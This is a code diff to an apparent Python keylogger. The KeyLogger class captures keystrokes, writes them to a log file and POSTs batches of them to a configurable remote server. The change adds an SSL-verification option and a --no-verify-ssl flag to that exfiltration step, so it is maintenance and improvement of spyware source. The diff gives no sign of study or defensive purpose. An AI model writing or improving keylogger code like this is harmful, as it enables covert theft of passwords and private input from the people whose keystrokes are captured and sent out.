@@ -32,7 +32,7 @@ GitHub: https://github.com/Stalin-143
 class KeyLogger:
     """Keylogger class to handle keyboard input capture and logging."""
 
-    def __init__(self, log_file_path, server_url, batch_size=10):
+    def __init__(self, log_file_path, server_url, batch_size=10, verify_ssl=True):
         """
         Initialize the KeyLogger.
 
@@ -40,10 +40,12 @@ class KeyLogger:
             log_file_path (str): Path to the log file
             server_url (str): URL of the server to send logs to
             batch_size (int): Number of keystrokes before sending to server
+            verify_ssl (bool): Whether to verify SSL certificates (default: True)
         """
         self.log_file_path = log_file_path
         self.server_url = server_url
         self.batch_size = batch_size
+        self.verify_ssl = verify_ssl
         self.buffer = []
 
         # Ensure the log directory exists
@@ -70,7 +72,12 @@ class KeyLogger:
 
         try:
             log_data = ''.join(self.buffer)
-            response = requests.post(self.server_url, data={"log": log_data}, timeout=10)
+            response = requests.post(
+                self.server_url,
+                data={"log": log_data},
+                timeout=10,
+                verify=self.verify_ssl  # Verify SSL certificates by default
+            )
 
             if response.status_code == 200:
                 print("Log sent successfully!")
@@ -80,6 +87,9 @@ class KeyLogger:
             # Clear the buffer after sending
             self.buffer = []
 
+        except requests.exceptions.SSLError as e:
+            print(f"SSL Error: {e}")
+            print("If using self-signed certificates, you can disable SSL verification (NOT recommended for production)")
         except requests.exceptions.RequestException as e:
             print(f"Error sending log: {e}")
 
@@ -186,6 +196,11 @@ def main():
         type=int,
         help='Override batch size from config'
     )
+    parser.add_argument(
+        '--no-verify-ssl',
+        action='store_true',
+        help='Disable SSL certificate verification (NOT recommended)'
+    )
 
     args = parser.parse_args()
 
@@ -197,14 +212,19 @@ def main():
     log_file_path = args.log_file or keylogger_config.get('log_file_path', 'logs/keylog.txt')
     server_url = args.server_url or keylogger_config.get('server_url', '')
     batch_size = args.batch_size or keylogger_config.get('batch_size', 10)
+    verify_ssl = not args.no_verify_ssl  # Default to True unless --no-verify-ssl is passed
 
     if not server_url:
         print("Error: Server URL not configured.")
         print("Please set server_url in config/config.json or use --server-url argument.")
         sys.exit(1)
+    
+    if args.no_verify_ssl:
+        print("⚠️  WARNING: SSL certificate verification is DISABLED!")
+        print("   This is NOT recommended for production use.")
 
     # Create and start the keylogger
-    keylogger = KeyLogger(log_file_path, server_url, batch_size)
+    keylogger = KeyLogger(log_file_path, server_url, batch_size, verify_ssl)
     keylogger.start()
 
 
